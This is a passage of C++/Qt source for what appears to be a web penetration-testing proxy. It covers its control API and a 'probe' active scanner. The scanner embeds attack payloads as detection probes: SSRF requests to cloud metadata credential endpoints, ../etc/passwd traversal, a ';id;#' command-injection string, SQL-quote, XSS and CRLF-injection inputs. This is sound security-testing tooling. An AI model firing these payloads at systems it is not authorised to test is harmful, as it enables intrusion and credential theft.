                co["expires"]  = c.expires;
                co["httpOnly"] = c.httpOnly;
                co["secure"]   = c.secure;
                co["sameSite"] = c.sameSite;
                cookies.append(co);
            }
            so["cookies"] = cookies;
            arr.append(so);
        }
        root["sessions"] = arr;
    }

    // history rows (match the mock shape so React renders without changes)
    QJsonArray rows;
    if (m_wiring.history) {
        const int n = m_wiring.history->rowCount();
        for (int i = 0; i < n; ++i) {
            const QModelIndex idx = m_wiring.history->index(i, 0);
            QJsonObject row;
            row["id"]      = m_wiring.history->data(idx, Nullock::FrontEnd::ProxyModel::IdRole).toInt();
            row["host"]    = m_wiring.history->data(idx, Nullock::FrontEnd::ProxyModel::HostRole).toString();
            row["method"]  = m_wiring.history->data(idx, Nullock::FrontEnd::ProxyModel::MethodRole).toString();
            row["url"]     = m_wiring.history->data(idx, Nullock::FrontEnd::ProxyModel::UrlRole).toString();
            row["path"]    = m_wiring.history->data(idx, Nullock::FrontEnd::ProxyModel::UrlRole).toString();
            row["status"]  = m_wiring.history->data(idx, Nullock::FrontEnd::ProxyModel::StatusCodeRole).toInt();
            row["mime"]    = m_wiring.history->data(idx, Nullock::FrontEnd::ProxyModel::MimeRole).toString();
            row["params"]  = m_wiring.history->data(idx, Nullock::FrontEnd::ProxyModel::ParamsRole).toInt();
            row["tls"]     = m_wiring.history->data(idx, Nullock::FrontEnd::ProxyModel::TlsRole).toBool();
            row["ip"]      = m_wiring.history->data(idx, Nullock::FrontEnd::ProxyModel::IpRole).toString();
            row["ts"]      = m_wiring.history->data(idx, Nullock::FrontEnd::ProxyModel::TimestampRole).toString();
            row["port"]    = m_wiring.history->portAt(i);
            // Surface response body size so the React stats panel can do
            // Wireshark-style "endpoints" aggregation. Request size feeds
            // the same per-host accounting.
            const auto *resp = m_wiring.history->responseAt(i);
            const auto *req  = m_wiring.history->requestAt(i);
            row["size"]    = resp ? static_cast<qint64>(resp->body.size()) : 0;
            row["reqSize"] = req  ? static_cast<qint64>(req->body.size())  : 0;
            row["elapsed"] = 0;
            rows.append(row);
        }
    }
    root["rows"] = rows;

    // sitemap
    QJsonArray sitemap;
    if (m_wiring.siteMap) {
        const int n = m_wiring.siteMap->rowCount();
        for (int i = 0; i < n; ++i) {
            const QModelIndex idx = m_wiring.siteMap->index(i, 0);
            QJsonObject entry;
            entry["host"]  = m_wiring.siteMap->data(idx, Nullock::FrontEnd::SiteMapModel::HostRole).toString();
            entry["count"] = m_wiring.siteMap->data(idx, Nullock::FrontEnd::SiteMapModel::CountRole).toInt();
            entry["tls"]   = m_wiring.siteMap->data(idx, Nullock::FrontEnd::SiteMapModel::TlsRole).toBool();
            sitemap.append(entry);
        }
    }
    root["sitemap"] = sitemap;

    // intercepted queue (current + future-pending count)
    QJsonArray intercepted;
    if (m_wiring.intercept && m_wiring.intercept->current()) {
        QObject *cur = m_wiring.intercept->current();
        QJsonObject e;
        e["id"]   = cur->property("id").toInt();
        e["host"] = cur->property("host").toString();
        e["port"] = cur->property("port").toInt();
        e["tls"]  = cur->property("tls").toBool();
        e["text"] = cur->property("text").toString();
        intercepted.append(e);
    }
    root["intercepted"]      = intercepted;
    root["interceptEnabled"] = m_wiring.intercept ? m_wiring.intercept->enabled() : false;

    // repeater
    QJsonObject repeater;
    if (m_wiring.repeater) {
        repeater["host"]       = m_wiring.repeater->host();
        repeater["port"]       = m_wiring.repeater->port();
        repeater["tls"]        = m_wiring.repeater->useTls();
        repeater["request"]    = m_wiring.repeater->requestText();
        repeater["response"]   = m_wiring.repeater->responseText();
        repeater["statusLine"] = m_wiring.repeater->statusLine();
        repeater["busy"]       = m_wiring.repeater->busy();
        repeater["activeTab"]  = m_wiring.repeater->activeTab();
        QJsonArray tabs;
        for (const auto &t : m_wiring.repeater->tabs()) {
            QJsonObject to;
            to["name"]       = t.name;
            to["host"]       = t.host;
            to["port"]       = t.port;
            to["tls"]        = t.useTls;
            to["statusLine"] = t.statusLine;
            tabs.append(to);
        }
        repeater["tabs"] = tabs;
    }
    root["repeater"] = repeater;

    // intruder
    QJsonObject intruder;
    if (m_wiring.intruder) {
        intruder["host"]     = m_wiring.intruder->host();
        intruder["port"]     = m_wiring.intruder->port();
        intruder["tls"]      = m_wiring.intruder->useTls();
        intruder["template"] = m_wiring.intruder->requestTemplate();
        intruder["payloads"] = QJsonArray::fromStringList(
            m_wiring.intruder->payloads().split('\n', Qt::SkipEmptyParts));
        intruder["running"]  = m_wiring.intruder->running();
        QJsonArray results;
        const int n = m_wiring.intruder->rowCount();
        for (int i = 0; i < n; ++i) {
            const QModelIndex idx = m_wiring.intruder->index(i, 0);
            QJsonObject r;
            const int status = m_wiring.intruder->data(idx, Nullock::Core::Intruder::StatusRole).toInt();
            const bool complete = m_wiring.intruder->data(idx, Nullock::Core::Intruder::CompleteRole).toBool();
            r["status"] = complete ? QJsonValue(status) : QJsonValue(QJsonValue::Null);
            r["size"]   = m_wiring.intruder->data(idx, Nullock::Core::Intruder::SizeRole).toInt();
            r["ms"]     = m_wiring.intruder->data(idx, Nullock::Core::Intruder::TimeRole).toInt();
            r["err"]    = m_wiring.intruder->data(idx, Nullock::Core::Intruder::ErrorRole).toString();
            results.append(r);
        }
        intruder["results"] = results;
    }
    root["intruder"] = intruder;

    // Update info -- one HTTPS round-trip at startup, cached forever.
    if (m_wiring.updates) {
        const auto u = m_wiring.updates->lastResult();
        QJsonObject upd;
        upd["available"]      = u.available;
        upd["currentVersion"] = u.currentVersion;
        upd["latestVersion"]  = u.latestVersion;
        upd["releaseUrl"]     = u.releaseUrl;
        upd["releaseNotes"]   = u.releaseNotes;
        upd["publishedAt"]    = u.publishedAt;
        root["update"] = upd;
    }

    // OAST sink visibility for the UI badge.
    if (m_wiring.oast) {
        QJsonObject oast;
        oast["running"]  = m_wiring.oast->running();
        oast["port"]     = m_wiring.oast->port();
        oast["baseHost"] = m_wiring.oast->baseHost();
        oast["hits"]     = m_wiring.oast->hitCount();
        if (m_wiring.oastCorrelator) {
            oast["registered"] = m_wiring.oastCorrelator->registeredCount();
            oast["confirmed"]  = m_wiring.oastCorrelator->confirmedCount();
        }
        if (m_wiring.dnsSink) {
            oast["dnsRunning"] = m_wiring.dnsSink->running();
            oast["dnsPort"]    = m_wiring.dnsSink->port();
            oast["dnsHits"]    = m_wiring.dnsSink->hitCount();
        }
        root["oast"] = oast;
    }

    // Session handling rules: snapshot the rule list + currently-bound
    // variable bag.
    if (m_wiring.sessionRules) {
        QJsonObject sr;
        QJsonArray rules;
        for (const auto &r : m_wiring.sessionRules->rules()) {
            QJsonObject o;
            o["name"]           = r.name;
            o["enabled"]        = r.enabled;
            o["hostGlob"]       = r.hostGlob;
            o["pathGlob"]       = r.pathGlob;
            o["extractFrom"]    = r.extractFrom;
            o["extractKey"]     = r.extractKey;
            o["variable"]       = r.variable;
            o["injectInto"]     = r.injectInto;
            o["injectKey"]      = r.injectKey;
            o["injectTemplate"] = r.injectTemplate;
            rules.append(o);
        }
        sr["rules"] = rules;
        QJsonObject vars;
        const auto bag = m_wiring.sessionRules->variables();
        for (auto it = bag.cbegin(); it != bag.cend(); ++it)
            vars[it.key()] = it.value();
        sr["variables"] = vars;
        root["sessionRules"] = sr;
    }

    return QJsonDocument(root).toJson(QJsonDocument::Compact);
}

QByteArray ControlServer::buildHistoryRow(int id, bool wantRequest) const {
    if (!m_wiring.history) return {};
    // Prefer the in-memory ProxyModel -- O(1) lookup, full structs.
    // If the id has been evicted from the window (200k-row engagement,
    // bounded window), fall back to the SQLite index which carries the
    // full req_json / resp_json blobs.
    const QString fromModel = wantRequest
        ? m_wiring.history->requestRawById(id)
        : m_wiring.history->responseRawById(id);
    if (!fromModel.isEmpty()) return fromModel.toUtf8();
    if (m_wiring.projectStore) {
        auto *idx = m_wiring.projectStore->historyIndex();
        if (idx && idx->isOpen()) {
            const QString cold = wantRequest
                ? idx->loadFullRequestRaw(id)
                : idx->loadFullResponseRaw(id);
            if (!cold.isEmpty()) return cold.toUtf8();
        }
    }
    return {};
}

QByteArray ControlServer::apiResponse(const QString &method, const QString &path,
                                       const QByteArray &body,
                                       const QString &query) const {
    // Method dispatch -- read-only endpoints accept GET; everything else
    // is treated as a state-mutating action and requires POST. This closes
    // the GET-via-<img> CSRF avenue on /api/history/<id>/probe + replay
    // and friends (where the old check only ran at the top-level guard).
    auto isReadPath = [](const QString &p) {
        return p == "/api/snapshot"
            || p == "/api/pac" || p == "/proxy.pac"
            || p == "/api/search"
            || p == "/api/project/list"
            || p == "/api/ws/sessions"
            || p == "/api/h2/streams"
            || p == "/api/h2/events"
            || p == "/api/oast/poll"
            || p == "/api/openapi/export"
            || p == "/api/cookies"
            || p == "/api/project/templates"
            || p == "/api/findings/grouped"
            || p.startsWith("/api/export/")
            || p.startsWith("/api/history/full/")
            // /api/history/<id>/request  or  /response  but NOT /probe or /replay
            || (p.startsWith("/api/history/")
                && (p.endsWith("/request") || p.endsWith("/response")));
    };
    if (!isReadPath(path) && method != "POST") {
        return httpResponse(405, "text/plain",
            "Use POST for mutating endpoints (see README)");
    }

    // GET /api/pac -- proxy auto-config file. Drop the URL into a browser's
    // "Automatic proxy configuration" field and everything routes through
    // our listener with no manual host/port juggling.
    if (path == "/api/pac" || path == "/proxy.pac") {
        const quint16 pport = m_wiring.proxy ? m_wiring.proxy->listeningPort() : 8888;
        QByteArray pac;
        pac += "// Nullock proxy auto-config -- generated " +
               QDateTime::currentDateTime().toString(Qt::ISODate).toUtf8() + "\n";
        pac += "function FindProxyForURL(url, host) {\n";
        pac += "    // Local traffic stays direct so the control UI keeps working.\n";
        pac += "    if (isPlainHostName(host)\n";
        pac += "        || shExpMatch(host, \"localhost\")\n";
        pac += "        || shExpMatch(host, \"127.*\")\n";
        pac += "        || shExpMatch(host, \"10.*\")\n";
        pac += "        || shExpMatch(host, \"192.168.*\")\n";
        pac += "        || shExpMatch(host, \"172.16.*\") || shExpMatch(host, \"172.17.*\")\n";
        pac += "        || shExpMatch(host, \"172.18.*\") || shExpMatch(host, \"172.19.*\")\n";
        pac += "        || shExpMatch(host, \"172.2?.*\")  || shExpMatch(host, \"172.30.*\")\n";
        pac += "        || shExpMatch(host, \"172.31.*\")) {\n";
        pac += "        return \"DIRECT\";\n";
        pac += "    }\n";
        pac += "    return \"PROXY 127.0.0.1:" + QByteArray::number(pport) + "\";\n";
        pac += "}\n";
        return httpResponse(200, "application/x-ns-proxy-autoconfig; charset=utf-8", pac);
    }

    // GET /api/search?q=<regex>&where=req|resp|both&limit=N
    // Scans every history row's request and/or response text for the
    // pattern and returns a list of { id, where, excerpt }. Bodies are
    // pulled from ProxyModel's cache which is already memoized, so
    // calling this is cheap even for hundreds of rows.
    if (path == "/api/search") {
        QJsonArray hits;
        if (m_wiring.history) {
            const QUrlQuery q(query);
            const QString pattern = q.queryItemValue("q");
            QString where = q.queryItemValue("where");
            if (where.isEmpty()) where = "both";
            const int limit = q.queryItemValue("limit").toInt() > 0
                                ? q.queryItemValue("limit").toInt() : 200;
            // ReDoS defence. Qt's PCRE backend doesn't expose a match-time
            // budget, so a hostile pattern like (a+)+$ run against MB of
            // captured body backtracks for tens of seconds and freezes
            // the whole API surface. Three guards:
            //  1. Cap pattern length -- bombs are usually short, but a
            //     malicious one inside a megabyte of legitimate text is
            //     just noise.
            //  2. Reject patterns whose shape screams "nested unbounded
            //     quantifier" -- the textbook bomb pattern. Heuristic,
            //     but the cost of a false positive is "user rewrites a
            //     weird regex," which is fine.
            //  3. Truncate each body to kSearchBodyCap and cap the total
            //     rows scanned. A 200-row × 1 MB scan completes in
            //     reasonable wall-clock even if the pattern is awkward.
            constexpr int kPatternMax     = 4 * 1024;
            constexpr int kSearchBodyCap  = 1 * 1024 * 1024;
            constexpr int kSearchRowCap   = 500;
            if (pattern.size() > kPatternMax) {
                return httpJson(400, QJsonObject{{ "error",
                    "search pattern too long (max 4 KB)" }});
            }
            static const QRegularExpression kBombShape(
                R"(\([^)]*[*+]\)[*+]|\([^)]*\{\d+,\}\)[*+])",
                QRegularExpression::NoPatternOption);
            if (kBombShape.match(pattern).hasMatch()) {
                return httpJson(400, QJsonObject{{ "error",
                    "search pattern contains nested unbounded quantifier "
                    "(potential catastrophic backtrack); rewrite or use a "
                    "narrower pattern" }});
            }
            if (!pattern.isEmpty()) {
                const QRegularExpression rx(pattern,
                    QRegularExpression::CaseInsensitiveOption
                  | QRegularExpression::MultilineOption);
                if (rx.isValid()) {
                    const int n = m_wiring.history->rowCount();
                    auto scan = [&](int row, const QString &text,
                                    const QString &whereLabel) {
                        if (hits.size() >= limit) return;
                        auto it = rx.globalMatch(text);
                        if (!it.hasNext()) return;
                        // Pull at most 3 line-excerpts per hit so the
                        // response stays small.
                        QStringList excerpts;
                        int count = 0;
                        while (it.hasNext() && count < 3) {
                            const auto m = it.next();
                            // Grab the line containing the match.
                            const int start = m.capturedStart();
                            int ls = text.lastIndexOf('\n', start - 1) + 1;
                            int le = text.indexOf('\n', start);
                            if (le < 0) le = text.size();
                            QString line = text.mid(ls, le - ls).trimmed();
                            if (line.size() > 240) line = line.left(237) + "...";
                            excerpts.append(line);
                            ++count;
                        }
                        QJsonObject hit;
                        const QModelIndex idx = m_wiring.history->index(row, 0);
                        const int id = m_wiring.history->data(idx,
                            Nullock::FrontEnd::ProxyModel::IdRole).toInt();
                        hit["id"]       = id;
                        hit["where"]    = whereLabel;
                        hit["excerpts"] = QJsonArray::fromStringList(excerpts);
                        hits.append(hit);
                    };
                    const int rowLoopMax = std::min(n, kSearchRowCap);
                    for (int row = 0; row < rowLoopMax && hits.size() < limit; ++row) {
                        if (where == "req" || where == "both") {
                            QString t = m_wiring.history->requestRawAt(row);
                            if (t.size() > kSearchBodyCap) t = t.left(kSearchBodyCap);
                            if (!t.isEmpty()) scan(row, t, "req");
                        }
                        if (hits.size() >= limit) break;
                        if (where == "resp" || where == "both") {
                            QString t = m_wiring.history->responseRawAt(row);
                            if (t.size() > kSearchBodyCap) t = t.left(kSearchBodyCap);
                            if (!t.isEmpty()) scan(row, t, "resp");
                        }
                    }
                } else {
                    return httpJson(400, QJsonObject{{ "error", "invalid regex" }});
                }
            }
        }
        QJsonObject root;
        root["hits"]  = hits;
        root["count"] = hits.size();
        return httpJson(200, root);
    }

    // ---- OAST (out-of-band callback sink) -----------------------------
    // GET /api/oast/poll?since=<id>  -- list new hits since <id>
    if (path == "/api/oast/poll") {
        if (!m_wiring.oast) return httpJson(200, QJsonObject{{ "running", false }});
        qint64 sinceId = 0;
        if (!query.isEmpty()) {
            const QUrlQuery q(query);
            sinceId = q.queryItemValue("since").toLongLong();
        }
        QJsonArray arr;
        for (const auto &h : m_wiring.oast->hitsSince(sinceId)) {
            QJsonObject o;
            o["id"]         = static_cast<double>(h.id);
            o["atMs"]       = static_cast<double>(h.atMs);
            o["token"]      = h.token;
            o["sourceIp"]   = h.sourceIp;
            o["method"]     = h.method;
            o["hostHeader"] = h.hostHeader;
            o["path"]       = h.path;
            o["bodyBytes"]  = h.bodyBytes;
            o["userAgent"]  = h.userAgent;
            o["bodyPreview"] = h.bodyPreview;
            arr.append(o);
        }
        QJsonObject root;
        root["running"] = m_wiring.oast->running();
        root["port"]    = m_wiring.oast->port();
        root["baseHost"] = m_wiring.oast->baseHost();
        root["hits"]    = arr;
        return httpJson(200, root);
    }

    // GET /api/h2/streams -- list every captured h2 stream summary.
    if (path == "/api/h2/streams") {
        QJsonArray arr;
        for (const auto &s : Nullock::Proxy::H2EventLog::instance()->streams()) {
            QJsonObject o;
            o["streamId"]   = s.streamId;
            o["conn"]       = s.conn;
            o["method"]     = s.method;
            o["path"]       = s.path;
            o["status"]     = s.status;
            o["bytesIn"]    = static_cast<double>(s.bytesIn);
            o["bytesOut"]   = static_cast<double>(s.bytesOut);
            o["framesIn"]   = s.framesIn;
            o["framesOut"]  = s.framesOut;
            o["lastError"]  = static_cast<int>(s.lastError);
            o["openedAtMs"] = static_cast<double>(s.openedAtMs);
            o["closed"]     = s.closed;
            arr.append(o);
        }
        QJsonObject r;  r["streams"] = arr;
        return httpJson(200, r);
    }

    // GET /api/h2/events?since=<ms> -- raw h2 frame stream.
    if (path == "/api/h2/events") {
        qint64 sinceTs = 0;
        if (!query.isEmpty()) {
            const QUrlQuery q(query);
            sinceTs = q.queryItemValue("since").toLongLong();
        }
        QJsonArray arr;
        const char *kTypes[] = {
            "DATA", "HEADERS", "PRIORITY", "RST_STREAM", "SETTINGS",
            "PUSH_PROMISE", "PING", "GOAWAY", "WINDOW_UPDATE", "CONTINUATION"
        };
        for (const auto &e : Nullock::Proxy::H2EventLog::instance()->eventsSince(sinceTs)) {
            QJsonObject o;
            o["ts"]        = static_cast<double>(e.ts);
            o["conn"]      = e.conn;
            o["type"]      = (e.frameType < 10)
                               ? QString::fromLatin1(kTypes[e.frameType])
                               : QString::number(e.frameType);
            o["flags"]     = e.flags;
            o["streamId"]  = e.streamId;
            o["bytes"]     = static_cast<double>(e.bytes);
            o["errorCode"] = static_cast<int>(e.errorCode);
            arr.append(o);
        }
        QJsonObject r;  r["events"] = arr;
        return httpJson(200, r);
    }

    if (path == "/api/ws/sessions") {
        QJsonArray arr;
        for (const auto &s : Nullock::Proxy::WsRepeater::instance()->sessions()) {
            QJsonObject o;
            o["id"]         = static_cast<double>(s.id);
            o["host"]       = s.host;
            o["port"]       = s.port;
            o["openedAtMs"] = static_cast<double>(s.openedAtMs);
            o["framesUp"]   = static_cast<double>(s.framesUp);
            o["framesDown"] = static_cast<double>(s.framesDown);
            arr.append(o);
        }
        QJsonObject root;
        root["sessions"] = arr;
        return httpJson(200, root);
    }

    if (path == "/api/snapshot") {
        // ?since=<seq> -> 304 if seq hasn't moved. Saves us building 13 KB
        // of JSON twice a second when nothing has happened.
        if (!query.isEmpty()) {
            const QUrlQuery q(query);   // raw query string; no leading '?'
            const QString since = q.queryItemValue("since");
            bool ok = false;
            const quint64 sinceSeq = since.toULongLong(&ok);
            if (ok && sinceSeq == m_seq)
                return httpResponse(304, "application/json", "{}", "Not Modified");
        }
        return httpResponse(200, "application/json; charset=utf-8", buildSnapshot());
    }

    // /api/history/{id}/request  or  /api/history/{id}/response
    if (path.startsWith("/api/history/")) {
        const QString rest = path.mid(QStringLiteral("/api/history/").size());
        const QStringList parts = rest.split('/');
        if (parts.size() == 2) {
            bool ok = false;
            const int id = parts[0].toInt(&ok);
            if (ok) {
                if (parts[1] == "probe") {
                    // Light active scan: walk the query params, substitute
                    // each value with a unique canary that contains HTML
                    // metacharacters, replay, scan the response body for
                    // the canary verbatim. If it reflects unencoded -> a
                    // candidate XSS sink. Emits Findings via the scanner's
                    // public reportFinding hook. Fire-and-forget; new
                    // findings show up in the next snapshot poll.
                    if (!m_wiring.history) return httpJson(404, QJsonObject{{ "error", "no history" }});
                    // Prefer the in-memory window; fall back to SQLite
                    // for evicted rows.
                    auto *src     = m_wiring.history->requestById(id);
                    auto *srcResp = m_wiring.history->responseById(id);
                    Nullock::Proxy::HttpRequest   coldReq;
                    Nullock::Proxy::HttpResponse  coldResp;
                    if (!src && m_wiring.projectStore) {
                        auto *idx = m_wiring.projectStore->historyIndex();
                        if (idx && idx->isOpen()) {
                            auto fr = idx->loadFullRow(id);
                            if (fr.ok) {
                                coldReq = std::move(fr.request);
                                coldResp = std::move(fr.response);
                                src     = &coldReq;
                                srcResp = &coldResp;
                            }
                        }
                    }
                    if (!src) return httpJson(404, QJsonObject{{ "error", "row not found" }});

                    const Nullock::Proxy::HttpRequest base = *src;

                    // Scope guard: refuse to fire active payloads at hosts
                    // the project does not consider in-scope. A malicious
                    // local web page that pivots through us would otherwise
                    // be able to attack arbitrary targets we'd once browsed.
                    if (m_wiring.proxy && !m_wiring.proxy->isInScope(base.host)) {
                        return httpJson(403, QJsonObject{
                            { "ok", false },
                            { "error", "row's host is out of scope; add it to "
                                       "Scope first if you really mean it" },
                        });
                    }

                    const bool useTls = srcResp ? srcResp->wasTls : false;

                    const int qmark = base.path.indexOf('?');
                    if (qmark < 0)
                        return httpJson(200, QJsonObject{{ "ok", true },
                                                          { "skipped", "no query params" }});
                    const QString prefix = base.path.left(qmark + 1);
                    const QStringList params =
                        base.path.mid(qmark + 1).split('&', Qt::SkipEmptyParts);
                    if (params.isEmpty())
                        return httpJson(200, QJsonObject{{ "ok", true },
                                                          { "skipped", "no params" }});

                    Wiring w = m_wiring;
                    const int rowId = id;  // 1-based -- same as snapshot id
                    const int srcStatusCode = srcResp ? srcResp->statusCode : 0;
                    (void)QtConcurrent::run([w, base, useTls, prefix, params, rowId, srcStatusCode]() {
                        Nullock::Core::HttpClient client;
                        const QString proto = useTls ? "https" : "http";
                        const QString hostPort  = (base.port == 80 || base.port == 443)
                                                  ? QString() : ":" + QString::number(base.port);
                        const QString baseUrl   = proto + "://" + base.host + hostPort + base.path;

                        auto report = [w, rowId, baseUrl, host = base.host]
                                      (const QString &sev, const QString &kind,
                                       const QString &summary, const QString &evidence) {
                            if (!w.scanner) return;
                            QMetaObject::invokeMethod(w.scanner, [w, rowId, host, baseUrl, sev, kind, summary, evidence]() {
                                w.scanner->reportFinding(rowId, sev, kind, summary,
                                                         evidence, host, baseUrl);
                            }, Qt::QueuedConnection);
                        };

                        // One worker fn: substitute param i with `payload`,
                        // run request through mutation pipeline, return result.
                        auto fire = [&](int i, const QString &payload) {
                            QStringList rewritten;
                            for (int j = 0; j < params.size(); ++j) {
                                if (j == i) {
                                    const QString p = params[j];
                                    const int eq = p.indexOf('=');
                                    const QString key = eq > 0 ? p.left(eq) : p;
                                    rewritten.append(key + "=" + payload);
                                } else {
                                    rewritten.append(params[j]);
                                }
                            }
                            Nullock::Proxy::HttpRequest r = base;
                            r.path = prefix + rewritten.join('&');
                            r.target = r.path;
                            if (w.extensions) r = w.extensions->applyRequestMutation(r);
                            if (w.proxy)      w.proxy->applyRequestRules(r);
                            const QByteArray bytes =
                                Nullock::Proxy::serializeRequestForOrigin(r);
                            return client.send(r.host,
                                static_cast<quint16>(r.port), useTls, bytes);
                        };

                        // Common SQL error fragments. Conservative list --
                        // false positives in the wild are worse than a
                        // missed hit, so only the ones I'd bet on.
                        static const char *kSqlErrSigs[] = {
                            "SQL syntax",                          // MySQL
                            "mysql_fetch_",
                            "ORA-",                                 // Oracle
                            "PostgreSQL query failed",
                            "psql:",
                            "PG::SyntaxError",
                            "Unclosed quotation mark",              // MS-SQL
                            "SQLSTATE[",                            // generic PDO
                            "syntax error at or near",              // Postgres
                            "Microsoft OLE DB Provider for ODBC",
                            "SQLite/JDBCDriver",
                            "sqlite3.OperationalError",
                        };

                        for (int i = 0; i < params.size(); ++i) {
                            const QString p = params[i];
                            const int eq = p.indexOf('=');
                            if (eq <= 0) continue;
                            const QString key = p.left(eq);
                            const QString tag = QString("%1").arg(
                                QRandomGenerator::global()->generate(),
                                8, 16, QChar('0'));

                            // ---- reflected XSS --------------------------------
                            {
                                const QString canary = "NL<x" + tag + ">";
                                const auto res = fire(i, canary);
                                if (res.ok) {
                                    const QString body = QString::fromUtf8(res.parsed.body);
                                    if (body.contains(canary)) {
                                        report("high", "reflected-xss",
                                               "Param '" + key + "' reflects unencoded in response",
                                               "param=" + key + " · canary=" + canary
                                               + " · reflected unencoded in response body");
                                    }
                                }
                            }

                            // ---- open redirect --------------------------------
                            // Plain external URL canary. If the response is
                            // a 3xx and Location: contains this exact host,
                            // the server is redirecting based on user input.
                            {
                                const QString redirCanary =
                                    "https://nullock-canary-" + tag + ".invalid/";
                                const auto res = fire(i, redirCanary);
                                if (res.ok && res.parsed.statusCode >= 300
                                    && res.parsed.statusCode < 400) {
                                    QString loc;
                                    for (const auto &h : res.parsed.headers) {
                                        if (h.first.compare("Location", Qt::CaseInsensitive) == 0) {
                                            loc = h.second; break;
                                        }
                                    }
                                    if (!loc.isEmpty() && loc.contains("nullock-canary-" + tag)) {
                                        report("high", "open-redirect",
                                               "Param '" + key + "' controls the redirect target",
                                               "param=" + key + " · payload=" + redirCanary
                                               + " · Location: " + loc);
                                    }
                                }
                            }

                            // ---- SSRF via cloud metadata ----------------------
                            // If the response body contains telltale strings
                            // from AWS/GCP/Azure metadata endpoints after we
                            // injected those URLs as the param value, the
                            // server is fetching attacker-controlled URLs
                            // (SSRF). Highest-value cloud finding -- usually
                            // leads to credential theft.
                            {
                                struct MetaProbe {
                                    const char *url;
                                    const char *signature;
                                    const char *label;
                                };
                                static const MetaProbe kCloudMeta[] = {
                                    { "http://169.254.169.254/latest/meta-data/",
                                      "instance-id", "aws-imds-v1" },
                                    { "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                                      "AccessKeyId", "aws-imds-iam" },
                                    { "http://metadata.google.internal/computeMetadata/v1/",
                                      "computeMetadata", "gcp-metadata" },
                                    { "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                                      "compute", "azure-imds" },
                                    { "http://100.100.100.200/latest/meta-data/",
                                      "instance-id", "aliyun-imds" },
                                };
                                for (const auto &mp : kCloudMeta) {
                                    const auto res = fire(i, QString::fromLatin1(mp.url));
                                    if (!res.ok) continue;
                                    const QString body = QString::fromUtf8(
                                        res.parsed.body.left(64 * 1024));
                                    if (body.contains(QString::fromLatin1(mp.signature),
                                                      Qt::CaseInsensitive)) {
                                        report("critical", "ssrf-cloud-metadata",
                                               QString("Param '%1' triggers fetch of %2 metadata endpoint")
                                                   .arg(key, QString::fromLatin1(mp.label)),
                                               QString("param=%1 · payload=%2 · response contained \"%3\"")
                                                   .arg(key,
                                                        QString::fromLatin1(mp.url),
                                                        QString::fromLatin1(mp.signature)));
                                        break;  // one finding per param is enough
                                    }
                                }
                            }

                            // ---- OAST out-of-band SSRF ----------------------
                            // Even when the response doesn't echo our payload,
                            // a server-side fetch can land at our OAST sink.
                            // Mint a token, embed the callback URL, fire; the
                            // /api/oast/poll endpoint later surfaces hits and
                            // ties them back to this row via the token.
                            if (w.oast && w.oast->running()) {
                                const auto tok = w.oast->mintToken();
                                const QString token   = tok.value("token").toString();
                                const QString hostUrl = tok.value("hostUrl").toString();
                                const QString pathUrl = tok.value("pathUrl").toString();
                                // Register BEFORE firing so a fast callback
                                // can't race ahead of the registry and be
                                // dropped as "unknown token".
                                if (w.oastCorrelator) {
                                    Nullock::Core::OastOrigin origin;
                                    origin.rowId = rowId;
                                    origin.host  = base.host;
                                    origin.param = key;
                                    origin.url   = pathUrl;
                                    origin.kind  = "ssrf-oast";
                                    w.oastCorrelator->registerToken(token, origin);
                                }
                                fire(i, pathUrl);   // fire-and-forget
                                fire(i, hostUrl);
                                report("info", "oast-token-fired",
                                       QString("Param '%1': OAST callback URLs embedded; "
                                               "a confirmed finding auto-appears if the "
                                               "target calls back").arg(key),
                                       QString("param=%1 · token=%2 · url=%3")
                                           .arg(key, token, pathUrl));
                            }

                            // ---- SQLi error ---------------------------------
                            // A single unbalanced quote often blows up an
                            // unparameterized query into a stack trace; we
                            // grep the response for known error fragments.
                            {
                                const QString sqlPayload = "'";
                                const auto res = fire(i, sqlPayload);
                                if (res.ok) {
                                    const QString body = QString::fromUtf8(res.parsed.body);
                                    QString hit;
                                    for (const char *sig : kSqlErrSigs) {
                                        if (body.contains(QString::fromLatin1(sig),
                                                          Qt::CaseInsensitive)) {
                                            hit = QString::fromLatin1(sig); break;
                                        }
                                    }
                                    if (!hit.isEmpty()) {
                                        report("high", "sqli-error",
                                               "Param '" + key + "' triggers a SQL error page",
                                               "param=" + key + " · payload=' · matched: " + hit);
                                    }
                                }
                            }

                            // ---- path traversal -----------------------------
                            // ../../../../etc/passwd canary. If the server
                            // includes our marker (root:x:0:0:) in the body,
                            // it served the local file.
                            {
                                const QString trav = "../../../../../../etc/passwd";
                                const auto res = fire(i, trav);
                                if (res.ok) {
                                    const QString body = QString::fromUtf8(res.parsed.body);
                                    if (body.contains("root:x:0:0:")
                                        || body.contains("daemon:x:1:1:")) {
                                        report("high", "path-traversal",
                                               "Param '" + key + "' resolves to /etc/passwd",
                                               "param=" + key + " · payload=" + trav
                                               + " · matched: root:x:0:0:");
                                    }
                                }
                            }

                            // ---- command injection (output channel) --------
                            // `;id` is the cheapest output-channel probe.
                            // We look for "uid=" in the body which is the
                            // canonical id(1) output. Quiet probes (sleep)
                            // require timing measurement and false-positive
                            // on slow upstreams, so output-channel only.
                            {
                                const QString cmdPayload = ";id;#";
                                const auto res = fire(i, cmdPayload);
                                if (res.ok) {
                                    const QString body = QString::fromUtf8(res.parsed.body);
                                    QRegularExpression rxUid(
                                        "uid=\\d+\\(.+\\) gid=\\d+");
                                    if (rxUid.match(body).hasMatch()) {
                                        report("high", "cmd-injection",
                                               "Param '" + key + "' executes shell commands",
                                               "param=" + key + " · payload=" + cmdPayload
                                               + " · uid=... line in response");
                                    }
                                }
                            }

                            // ---- CRLF header injection ---------------------
                            // Inject %0d%0a marker and look for it as a real
                            // header in the response. Some servers reflect the
                            // injected newline into a Set-Cookie or Location.
                            // No literal whitespace in the payload -- it
                            // would break the request line; %20 percent-
                            // encodes the space.
                            {
                                const QString crlfPayload =
                                    "x%0d%0aX-Nullock-Inject:%20" + tag;
                                const auto res = fire(i, crlfPayload);
                                if (res.ok) {
                                    bool found = false;
                                    for (const auto &h : res.parsed.headers) {
                                        if (h.first.compare("X-Nullock-Inject",
                                                            Qt::CaseInsensitive) == 0
                                            && h.second.contains(tag)) {
                                            found = true; break;
                                        }
                                    }
                                    if (found) {
                                        report("high", "crlf-injection",
                                               "Param '" + key + "' allows CRLF header injection",
                                               "param=" + key + " · payload=" + crlfPayload
                                               + " · injected header appeared in response");
                                    }
                                }
                            }

                            // ---- LFI (Local File Inclusion) ---------------
                            // Hit common targets with encoded depth variants.
                            // Confirm by looking for the unique signature of
                            // /etc/passwd ("root:x:") or win.ini ("[fonts]").
